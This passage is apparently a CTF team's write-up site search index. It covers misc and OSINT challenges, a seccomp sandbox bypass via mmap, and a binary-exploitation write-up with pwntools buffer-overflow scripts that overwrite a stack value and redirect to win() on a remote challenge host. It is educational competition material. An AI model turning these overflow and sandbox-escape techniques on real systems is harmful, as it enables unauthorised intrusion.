Image","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#quickfix","text":"","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#description","text":"We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python.","title":"Description"},{"location":"misc/DarkCTF/quick/#solution-script","text":"from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new(\"RGB\", (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i,\"rb+\") as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png')","title":"Solution Script"},{"location":"misc/DarkCTF/quick/#solution","text":"Flag: Flag Image","title":"Solution"},{"location":"misc/DarkCTF/quick/#_1","text":"","title":""},{"location":"misc/HSCTF7/Emojis/","text":"Emojis - Misc HSCTF2020 Description This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code. Replicated Code The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118 Solution Flag: flag{tr3v0r-pAck3p}","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#description","text":"This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code.","title":"Description"},{"location":"misc/HSCTF7/Emojis/#replicated-code","text":"The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118","title":"Replicated Code"},{"location":"misc/HSCTF7/Emojis/#solution","text":"Flag: flag{tr3v0r-pAck3p}","title":"Solution"},{"location":"misc/HSCTF7/Emojis/#_1","text":"","title":""},{"location":"misc/dawgctf_21/third_eye/thirdeye/","text":"Third Eye DESCRIPTION: SOLUTION: The audio file is run with a spectrogram layer. Then we get, The value shown in the above image is then hex decoded to get the flag. FLAG: DawgCTF{syn3sth3s1acs}","title":"Third Eye"},{"location":"misc/dawgctf_21/third_eye/thirdeye/#third-eye","text":"","title":"Third Eye"},{"location":"misc/dawgctf_21/third_eye/thirdeye/#description","text":"","title":"DESCRIPTION:"},{"location":"misc/dawgctf_21/third_eye/thirdeye/#solution","text":"The audio file is run with a spectrogram layer. Then we get, The value shown in the above image is then hex decoded to get the flag.","title":"SOLUTION:"},{"location":"misc/dawgctf_21/third_eye/thirdeye/#flag","text":"DawgCTF{syn3sth3s1acs}","title":"FLAG:"},{"location":"misc/dawgctf_21/two_truths_and_a_fib/fib/","text":"Two truths and a fib DESCRIPTION: SOLUTION: When we connect: The program asks us to choose the fibinoaci numbers out of the given numbers. Script: def fib(l) : ans = [] for i in l : y = [is_square((5*i*i) + 4 ),is_square((5*i*i) - 4)] if 1 in y : ans.append(i) return ans def connect() : r = remote('umbccd.io', 6000) while(True) : print(r.recvuntil(\"[\")) l = list(map(int,r.recvline().decode().strip()[:-1].split(\", \"))) print(l) ans = fib(l) for i in ans : r.recv() r.sendline(str(i)) FLAG: DawgCTF{jU$T_l1k3_w3lc0me_w33k}","title":"Two truths and a fib"},{"location":"misc/dawgctf_21/two_truths_and_a_fib/fib/#two-truths-and-a-fib","text":"","title":"Two truths and a fib"},{"location":"misc/dawgctf_21/two_truths_and_a_fib/fib/#description","text":"","title":"DESCRIPTION:"},{"location":"misc/dawgctf_21/two_truths_and_a_fib/fib/#solution","text":"When we connect: The program asks us to choose the fibinoaci numbers out of the given numbers.","title":"SOLUTION:"},{"location":"misc/dawgctf_21/two_truths_and_a_fib/fib/#script","text":"def fib(l) : ans = [] for i in l : y = [is_square((5*i*i) + 4 ),is_square((5*i*i) - 4)] if 1 in y : ans.append(i) return ans def connect() : r = remote('umbccd.io', 6000) while(True) : print(r.recvuntil(\"[\")) l = list(map(int,r.recvline().decode().strip()[:-1].split(\", \"))) print(l) ans = fib(l) for i in ans : r.recv() r.sendline(str(i))","title":"Script:"},{"location":"misc/dawgctf_21/two_truths_and_a_fib/fib/#flag","text":"DawgCTF{jU$T_l1k3_w3lc0me_w33k}","title":"FLAG:"},{"location":"misc/tamuCTF/pybox/","text":"Pybox The challenge was a sandbox challenge and we were given the source of the secured server box which is a python interpreter which can import modules and also execute the python code we pass to it, It does not allow any read syscall from executing. This is implemented using the seccomp with BLOCKED-SYSCALLS = [0, 17, 19] which corresponds to all the read syscalls. So we need to find a way to read the flag.txt file from the server without the help of any read syscalls. So the first approach was to look at any other syscall which would in turn red the file contents without invoking the BLOCKED-SYSCALLS . This search led to mmap module in python. import mmap filepath=\"flag.txt\" file_object= open(filepath,mode=\"r\",encoding=\"utf8\") mmap_object= mmap.mmap(file_object.fileno(),length=0,access=mmap.ACCESS_READ,offset=0) txt=mmap_object.read() print(txt) On executing the above code we were able to invoke read of the file contects from the memory using the memread syscall. flag gigem{m3m0ry_m4pp3d_f1l35}","title":"Pybox"},{"location":"misc/tamuCTF/pybox/#pybox","text":"The challenge was a sandbox challenge and we were given the source of the secured server box which is a python interpreter which can import modules and also execute the python code we pass to it, It does not allow any read syscall from executing. This is implemented using the seccomp with BLOCKED-SYSCALLS = [0, 17, 19] which corresponds to all the read syscalls. So we need to find a way to read the flag.txt file from the server without the help of any read syscalls. So the first approach was to look at any other syscall which would in turn red the file contents without invoking the BLOCKED-SYSCALLS . This search led to mmap module in python. import mmap filepath=\"flag.txt\" file_object= open(filepath,mode=\"r\",encoding=\"utf8\") mmap_object= mmap.mmap(file_object.fileno(),length=0,access=mmap.ACCESS_READ,offset=0) txt=mmap_object.read() print(txt) On executing the above code we were able to invoke read of the file contects from the memory using the memread syscall. flag gigem{m3m0ry_m4pp3d_f1l35}","title":"Pybox"},{"location":"misc/tamuCTF/archival/archival/","text":"ARCHIVAL: OSINT DESCRIPTION: I can't remember the flag... it used to be on our website but when we updated it the flag got lost in the process. Since nothing ever gets deleted on the internet it should be safe, but how? SOLUTION: It's a simple solvable by using the wayback machine FLAG: gigem{s1t3_und3r_c0n57ruc710n}","title":"ARCHIVAL: OSINT"},{"location":"misc/tamuCTF/archival/archival/#archival-osint","text":"","title":"ARCHIVAL: OSINT"},{"location":"misc/tamuCTF/archival/archival/#description","text":"I can't remember the flag... it used to be on our website but when we updated it the flag got lost in the process. Since nothing ever gets deleted on the internet it should be safe, but how?","title":"DESCRIPTION:"},{"location":"misc/tamuCTF/archival/archival/#solution","text":"It's a simple solvable by using the wayback machine","title":"SOLUTION:"},{"location":"misc/tamuCTF/archival/archival/#flag","text":"gigem{s1t3_und3r_c0n57ruc710n}","title":"FLAG:"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/","text":"ELIZABETH IS MISSING : OSINT DESCRIPTION: Friends have reported Elizabeth missing and need your help locating her! Can you follow the clues in the missing person flyer and find her most recent location? SOLUTION: After decoding the cipher, we get \"Hey! I'm hosting a retrea for my clients so I'll e off the grid for awhie - I got a new phone nuber, so call me if you ned anything (979)429-2176.\" You will recieve a voice mail if you call \"(979)429-2176\". The voice mail directs us to a website: https://eowensphotography.weebly.com/ You get the flag from the website FLAG: gigem{M42V3LisbetterthanDCC0M1C5}","title":"ELIZABETH IS MISSING : OSINT"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#elizabeth-is-missing-osint","text":"","title":"ELIZABETH IS MISSING : OSINT"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#description","text":"Friends have reported Elizabeth missing and need your help locating her! Can you follow the clues in the missing person flyer and find her most recent location?","title":"DESCRIPTION:"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#solution","text":"After decoding the cipher, we get \"Hey! I'm hosting a retrea for my clients so I'll e off the grid for awhie - I got a new phone nuber, so call me if you ned anything (979)429-2176.\" You will recieve a voice mail if you call \"(979)429-2176\". The voice mail directs us to a website: https://eowensphotography.weebly.com/ You get the flag from the website","title":"SOLUTION:"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#flag","text":"gigem{M42V3LisbetterthanDCC0M1C5}","title":"FLAG:"},{"location":"misc/tamuCTF/gilberto/Gilberto%E2%80%99s%20Brother-OSINT/","text":"Gilberto\u2019s Brother-OSINT Description Try to reveal what is hidden in this jpg. Solution: We are given only a screenshot. But if we look closely we find a twitter tab open. After a bit of googling, we found the twitter account 'Gilberto Georcia' From his profile we get his date of birth November 20, 1994. On checking Gilberto's profile, we find a tweet So, this must be Gilberto's brother that we are searching for. @gerardo_2001_ Going through his profile, we can guess his birth year from the username i.e 2001 . On going through his profile, we find a tweet which tells us his bday - Dec 23, 2001 Also there is a link to his github account. Going through the profile, we can get the company name - Greg Tech Difference between November 20, 1994 and December 23, 2001 is 2590 Therefore, the flag: gigem{greg_tech_2590} Flag gigem{greg_tech_2590}","title":"Gilberto\u2019s Brother-OSINT"},{"location":"misc/tamuCTF/gilberto/Gilberto%E2%80%99s%20Brother-OSINT/#gilbertos-brother-osint","text":"","title":"Gilberto\u2019s Brother-OSINT"},{"location":"misc/tamuCTF/gilberto/Gilberto%E2%80%99s%20Brother-OSINT/#description","text":"Try to reveal what is hidden in this jpg.","title":"Description"},{"location":"misc/tamuCTF/gilberto/Gilberto%E2%80%99s%20Brother-OSINT/#solution","text":"We are given only a screenshot. But if we look closely we find a twitter tab open. After a bit of googling, we found the twitter account 'Gilberto Georcia' From his profile we get his date of birth November 20, 1994. On checking Gilberto's profile, we find a tweet So, this must be Gilberto's brother that we are searching for. @gerardo_2001_ Going through his profile, we can guess his birth year from the username i.e 2001 . On going through his profile, we find a tweet which tells us his bday - Dec 23, 2001 Also there is a link to his github account. Going through the profile, we can get the company name - Greg Tech Difference between November 20, 1994 and December 23, 2001 is 2590 Therefore, the flag: gigem{greg_tech_2590}","title":"Solution:"},{"location":"misc/tamuCTF/gilberto/Gilberto%E2%80%99s%20Brother-OSINT/#flag","text":"gigem{greg_tech_2590}","title":"Flag"},{"location":"misc/tamuCTF/gilberto/gilberto/","text":"Gilberto\u2019s Brother-OSINT Description Try to reveal what is hidden in this jpg. Solution: We are given only a screenshot. But if we look closely we find a twitter tab open. After a bit of googling, we found the twitter account 'Gilberto Georcia' From his profile we get his date of birth November 20, 1994. On checking Gilberto's profile, we find a tweet So, this must be Gilberto's brother that we are searching for. @gerardo_2001_ Going through his profile, we can guess his birth year from the username i.e 2001 . On going through his profile, we find a tweet which tells us his bday - Dec 23, 2001 Also there is a link to his github account. Going through the profile, we can get the company name - Greg Tech Difference between November 20, 1994 and December 23, 2001 is 2590 Therefore, the flag: gigem{greg_tech_2590} Flag gigem{greg_tech_2590}","title":"Gilberto\u2019s Brother-OSINT"},{"location":"misc/tamuCTF/gilberto/gilberto/#gilbertos-brother-osint","text":"","title":"Gilberto\u2019s Brother-OSINT"},{"location":"misc/tamuCTF/gilberto/gilberto/#description","text":"Try to reveal what is hidden in this jpg.","title":"Description"},{"location":"misc/tamuCTF/gilberto/gilberto/#solution","text":"We are given only a screenshot. But if we look closely we find a twitter tab open. After a bit of googling, we found the twitter account 'Gilberto Georcia' From his profile we get his date of birth November 20, 1994. On checking Gilberto's profile, we find a tweet So, this must be Gilberto's brother that we are searching for. @gerardo_2001_ Going through his profile, we can guess his birth year from the username i.e 2001 . On going through his profile, we find a tweet which tells us his bday - Dec 23, 2001 Also there is a link to his github account. Going through the profile, we can get the company name - Greg Tech Difference between November 20, 1994 and December 23, 2001 is 2590 Therefore, the flag: gigem{greg_tech_2590}","title":"Solution:"},{"location":"misc/tamuCTF/gilberto/gilberto/#flag","text":"gigem{greg_tech_2590}","title":"Flag"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/","text":"Marvel vs DC: OSINT Description: This young concept artist attended the Cleveland Institute of Art and has quite the fan base after working on several Marvel movies, notably Avengers Endgame and Black Panther. You are interested in his drawing techniques so you attend an art expo to learn more, can you find the flag? Solution: The young concept artist from the description is none other than Wesley Burt. In his instagram, He had made a post of Lightbox art expo. After looking through the social media accounts of Lightbox,I found nothing. So I started searching for Lightbox expo in general. After looking deep into the abyss of internet,the flag was found. Flag: gigem{M42V3LisbetterthanDCC0M1C5}","title":"Marvel vs DC: OSINT"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#marvel-vs-dc-osint","text":"","title":"Marvel vs DC: OSINT"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#description","text":"This young concept artist attended the Cleveland Institute of Art and has quite the fan base after working on several Marvel movies, notably Avengers Endgame and Black Panther. You are interested in his drawing techniques so you attend an art expo to learn more, can you find the flag?","title":"Description:"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#solution","text":"The young concept artist from the description is none other than Wesley Burt. In his instagram, He had made a post of Lightbox art expo. After looking through the social media accounts of Lightbox,I found nothing. So I started searching for Lightbox expo in general. After looking deep into the abyss of internet,the flag was found.","title":"Solution:"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#flag","text":"gigem{M42V3LisbetterthanDCC0M1C5}","title":"Flag:"},{"location":"misc/tamuCTF/spectral_imaging/spectral/","text":"SPECTRAL IMAGINING: SIGNIT DESCRIPTION: Some things are meant to be heard but not seen. This sounds like it's meant to be seen, not heard. SOLUTION: It is a Morse audio. Just running it through a decoder will give you the flag FLAG: gigem{4ud10_m4d3_v15u4L}","title":"SPECTRAL IMAGINING: SIGNIT"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#spectral-imagining-signit","text":"","title":"SPECTRAL IMAGINING: SIGNIT"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#description","text":"Some things are meant to be heard but not seen. This sounds like it's meant to be seen, not heard.","title":"DESCRIPTION:"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#solution","text":"It is a Morse audio. Just running it through a decoder will give you the flag","title":"SOLUTION:"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#flag","text":"gigem{4ud10_m4d3_v15u4L}","title":"FLAG:"},{"location":"misc/zh3r0CTF/maniacs_game/","text":"A Small Maniac's game points - 100 Description : A game that zh3r0 guys asked for \ud83d\ude25 Note: Solve all the levels and then click submit the solution button and wait for 40 seconds to get the flag. Solution : level 0: here we make use of \"MOVE A1 A2\" instruction where in A1 is the amount of steps and A2 is the direction. level 1: same instructions are used to navigate here too. level 2: \"READ A1\" will read the input and store it into A1 whereas \"UNLOCK A2\" has key = A2 which is used to unlock the door. level 3: the instruction \"ADD M1 A1 A2\" stores the result of A1+A2 into M1. And so other operations of subtraction and multiplication are also obtained. level 4: \"JMP A1\" will allow us to jump to a line in the code. level 5: level 6: \"JMPZ A1 A2\" jumps to line A1 if A2 is 0, whereas \"JMPN A1 A2\" jumps to line A1 if A2 is negative. level 7: moving in the clockwise and solving the equation. level 8: \"CMP M1 A1 A2\" is used to compare A1 and A2. If A1 > A2 then M1 = 1; if A1 = A2 then M1 = 0; if A1 < A2 then M1 = -1 level 9: we make use \"JMP\" instructions to run a loop. level 10: \"[[2]]\" implies double dereference. i.e if 2nd register contains 3 and third register contains 54, then \"[[2]]\" will evaluate to 54. level 11: register \"[7]\" contains number of steps taken. It doesn't increment once it hits a block. level 12: we can use all the above instructions to run a loop in order to check if the input is prime or not. Flag :","title":"A Small Maniac's game"},{"location":"misc/zh3r0CTF/maniacs_game/#a-small-maniacs-game","text":"points - 100","title":"A Small Maniac's game"},{"location":"misc/zh3r0CTF/maniacs_game/#description","text":"A game that zh3r0 guys asked for \ud83d\ude25 Note: Solve all the levels and then click submit the solution button and wait for 40 seconds to get the flag.","title":"Description :"},{"location":"misc/zh3r0CTF/maniacs_game/#solution","text":"","title":"Solution :"},{"location":"misc/zh3r0CTF/maniacs_game/#level-0-here-we-make-use-of-move-a1-a2-instruction-where-in-a1-is-the-amount-of-steps-and-a2-is-the-direction","text":"","title":"level 0: here we make use of \"MOVE A1 A2\" instruction where in A1 is the amount of steps and A2 is the direction."},{"location":"misc/zh3r0CTF/maniacs_game/#level-1-same-instructions-are-used-to-navigate-here-too","text":"","title":"level 1: same instructions are used to navigate here too."},{"location":"misc/zh3r0CTF/maniacs_game/#level-2-read-a1-will-read-the-input-and-store-it-into-a1-whereas-unlock-a2-has-key-a2-which-is-used-to-unlock-the-door","text":"","title":"level 2: \"READ A1\" will read the input and store it into A1 whereas \"UNLOCK A2\" has key = A2 which is used to unlock the door."},{"location":"misc/zh3r0CTF/maniacs_game/#level-3-the-instruction-add-m1-a1-a2-stores-the-result-of-a1a2-into-m1-and-so-other-operations-of-subtraction-and-multiplication-are-also-obtained","text":"","title":"level 3: the instruction \"ADD M1 A1 A2\" stores the result of A1+A2 into M1. And so other operations of subtraction and multiplication are also obtained."},{"location":"misc/zh3r0CTF/maniacs_game/#level-4-jmp-a1-will-allow-us-to-jump-to-a-line-in-the-code","text":"","title":"level 4: \"JMP A1\" will allow us to jump to a line in the code."},{"location":"misc/zh3r0CTF/maniacs_game/#level-5","text":"","title":"level 5:"},{"location":"misc/zh3r0CTF/maniacs_game/#level-6-jmpz-a1-a2-jumps-to-line-a1-if-a2-is-0-whereas-jmpn-a1-a2-jumps-to-line-a1-if-a2-is-negative","text":"","title":"level 6: \"JMPZ A1 A2\" jumps to line A1 if A2 is 0, whereas \"JMPN A1 A2\" jumps to line A1 if A2 is negative."},{"location":"misc/zh3r0CTF/maniacs_game/#level-7-moving-in-the-clockwise-and-solving-the-equation","text":"","title":"level 7: moving in the clockwise and solving the equation."},{"location":"misc/zh3r0CTF/maniacs_game/#level-8-cmp-m1-a1-a2-is-used-to-compare-a1-and-a2-if-a1-a2-then-m1-1-if-a1-a2-then-m1-0-if-a1-a2-then-m1-1","text":"","title":"level 8: \"CMP M1 A1 A2\" is used to compare A1 and A2. If A1 &gt; A2 then M1 = 1; if A1 = A2 then M1 = 0; if A1 &lt; A2 then M1 = -1"},{"location":"misc/zh3r0CTF/maniacs_game/#level-9-we-make-use-jmp-instructions-to-run-a-loop","text":"","title":"level 9: we make use \"JMP\" instructions to run a loop."},{"location":"misc/zh3r0CTF/maniacs_game/#level-10-2-implies-double-dereference-ie-if-2nd-register-contains-3-and-third-register-contains-54-then-2-will-evaluate-to-54","text":"","title":"level 10: \"[[2]]\" implies double dereference. i.e if 2nd register contains 3 and third register contains 54, then \"[[2]]\" will evaluate to 54."},{"location":"misc/zh3r0CTF/maniacs_game/#level-11-register-7-contains-number-of-steps-taken-it-doesnt-increment-once-it-hits-a-block","text":"","title":"level 11: register \"[7]\" contains number of steps taken. It doesn't increment once it hits a block."},{"location":"misc/zh3r0CTF/maniacs_game/#level-12-we-can-use-all-the-above-instructions-to-run-a-loop-in-order-to-check-if-the-input-is-prime-or-not","text":"","title":"level 12: we can use all the above instructions to run a loop in order to check if the input is prime or not."},{"location":"misc/zh3r0CTF/maniacs_game/#flag","text":"","title":"Flag :"},{"location":"pwning/intro/","text":"Binary Exploitation Introduction \"Write about Pwn and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit BlueHens CTF Beef-Of-Finitude - Shravya Bhaskara TamuCTF 21 tictactoe - SandraBino lottery - Shravya Bhaskara Cyber Apocalypse HTBCTF21 Controller - Adhithya Sree Mohan TamuCTF 22 ctf_sim - Shravya Bhaskara void - Shravya Bhaskara","title":"Binary Exploitation"},{"location":"pwning/intro/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"pwning/intro/#introduction","text":"\"Write about Pwn and about the writeups\"","title":"Introduction"},{"location":"pwning/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit BlueHens CTF Beef-Of-Finitude - Shravya Bhaskara TamuCTF 21 tictactoe - SandraBino lottery - Shravya Bhaskara Cyber Apocalypse HTBCTF21 Controller - Adhithya Sree Mohan TamuCTF 22 ctf_sim - Shravya Bhaskara void - Shravya Bhaskara","title":"The contents of this repo"},{"location":"pwning/BlueHensCTF/beef-of-finitude/","text":"Beef_Of_Finitude To start off, we see a main function which calls function myFun. This functions takes in two inputs (strings), one as name and the other as password. An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun. The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. To do that we may use the following code: from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('shravya') r.recvuntil('Enter your password:') r.send('B'*26 + p32(0xdeadbeef)) r.interactive() Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function. The gdb dump for the win() function is: 0x08049240 <+10>: sub esp,0x12c ; the stack size defined for win function is 0x12c or 300 bytes, whereas that for password input of myFun was 336 bytes. 0x08049246 <+16>: call 0x8049170 <__x86.get_pc_thunk.bx> ; which implies that we can overflow the buffer into yet another function, i.e the win() function. To do so, we will first have to fill the above stack with 336-300 = 36 bytes, since the win function accpets 4 arguments, 0x0804924b <+21>: add ebx,0x2db5 ; 0x08049251 <+27>: mov ecx,DWORD PTR [ebp+0x8] ; the following lines determine the 4 arguments to the win() function, 0x08049254 <+30>: mov DWORD PTR [ebp-0x130],ecx ; if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0))) 0x0804925a <+36>: mov ecx,DWORD PTR [ebp+0xc] ; thus param_2 = 0; param_1 = 0x14b4da55 and param_3 = 0; param_4 = 0x67616c66 0x0804925d <+39>: mov DWORD PTR [ebp-0x12c],ecx 0x08049263 <+45>: mov ecx,DWORD PTR [ebp+0x10] 0x08049266 <+48>: mov DWORD PTR [ebp-0x138],ecx 0x0804926c <+54>: mov ecx,DWORD PTR [ebp+0x14] 0x0804926f <+57>: mov DWORD PTR [ebp-0x134],ecx 0x08049275 <+63>: mov ecx,DWORD PTR [ebp-0x130] 0x0804927b <+69>: xor ecx,0x14b4da55 0x08049281 <+75>: mov esi,ecx 0x08049283 <+77>: mov ecx,DWORD PTR [ebp-0x12c] 0x08049289 <+83>: xor ch,0x0 0x0804928c <+86>: mov edi,ecx 0x0804928e <+88>: mov ecx,edi 0x08049290 <+90>: or ecx,esi 0x08049292 <+92>: test ecx,ecx 0x08049294 <+94>: jne 0x80492c0 <win+138> 0x08049296 <+96>: mov ecx,DWORD PTR [ebp-0x138] 0x0804929c <+102>: xor ecx,0x67616c66 Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we will have to: 1. rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with, 2. rewrite the return address stored at eip to that of the win function, 3. pass arguments of win function, i.e param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0) python program : (cotinuation) ``` from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('hi') r.recvuntil('Enter your password:') r.sendline('B' 26 + p32(0xdeadbeef) + 'B' 12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0)) r.interactive() ``` Flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}","title":"Beef_Of_Finitude"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#beef_of_finitude","text":"To start off, we see a main function which calls function myFun. This functions takes in two inputs (strings), one as name and the other as password. An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun. The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. To do that we may use the following code: from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('shravya') r.recvuntil('Enter your password:') r.send('B'*26 + p32(0xdeadbeef)) r.interactive() Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function.","title":"Beef_Of_Finitude"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#the-gdb-dump-for-the-win-function-is","text":"0x08049240 <+10>: sub esp,0x12c ; the stack size defined for win function is 0x12c or 300 bytes, whereas that for password input of myFun was 336 bytes. 0x08049246 <+16>: call 0x8049170 <__x86.get_pc_thunk.bx> ; which implies that we can overflow the buffer into yet another function, i.e the win() function. To do so, we will first have to fill the above stack with 336-300 = 36 bytes, since the win function accpets 4 arguments, 0x0804924b <+21>: add ebx,0x2db5 ; 0x08049251 <+27>: mov ecx,DWORD PTR [ebp+0x8] ; the following lines determine the 4 arguments to the win() function, 0x08049254 <+30>: mov DWORD PTR [ebp-0x130],ecx ; if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0))) 0x0804925a <+36>: mov ecx,DWORD PTR [ebp+0xc] ; thus param_2 = 0; param_1 = 0x14b4da55 and param_3 = 0; param_4 = 0x67616c66 0x0804925d <+39>: mov DWORD PTR [ebp-0x12c],ecx 0x08049263 <+45>: mov ecx,DWORD PTR [ebp+0x10] 0x08049266 <+48>: mov DWORD PTR [ebp-0x138],ecx 0x0804926c <+54>: mov ecx,DWORD PTR [ebp+0x14] 0x0804926f <+57>: mov DWORD PTR [ebp-0x134],ecx 0x08049275 <+63>: mov ecx,DWORD PTR [ebp-0x130] 0x0804927b <+69>: xor ecx,0x14b4da55 0x08049281 <+75>: mov esi,ecx 0x08049283 <+77>: mov ecx,DWORD PTR [ebp-0x12c] 0x08049289 <+83>: xor ch,0x0 0x0804928c <+86>: mov edi,ecx 0x0804928e <+88>: mov ecx,edi 0x08049290 <+90>: or ecx,esi 0x08049292 <+92>: test ecx,ecx 0x08049294 <+94>: jne 0x80492c0 <win+138> 0x08049296 <+96>: mov ecx,DWORD PTR [ebp-0x138] 0x0804929c <+102>: xor ecx,0x67616c66 Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we will have to: 1. rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with, 2. rewrite the return address stored at eip to that of the win function, 3. pass arguments of win function, i.e param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0)","title":"The gdb dump for the win() function is:"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#python-program-cotinuation","text":"``` from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('hi') 